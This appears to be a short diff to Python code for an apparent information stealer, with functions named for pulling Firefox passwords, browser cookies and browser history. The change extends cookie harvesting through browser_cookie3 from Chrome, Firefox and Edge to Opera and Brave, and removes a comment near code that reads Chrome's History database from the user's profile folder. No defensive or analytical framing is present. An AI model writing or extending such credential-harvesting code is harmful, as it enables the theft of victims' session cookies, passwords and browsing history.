@@ -106,7 +106,7 @@ def get_firefox_passwords():
 def get_browser_cookies():
     try:
         cookies = []
-        for browser in ["chrome", "firefox", "edge"]:
+        for browser in ["chrome", "firefox", "edge","opera","brave"]:
             try:
                 for cookie in browser_cookie3.load(browser):
                     cookies.append({
@@ -124,7 +124,6 @@ def get_browser_cookies():
 def get_browser_history():
     try:
         history = []
-        # Chrome/Edge history (SQLite)
         if os.name == 'nt':
             history_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
         else:
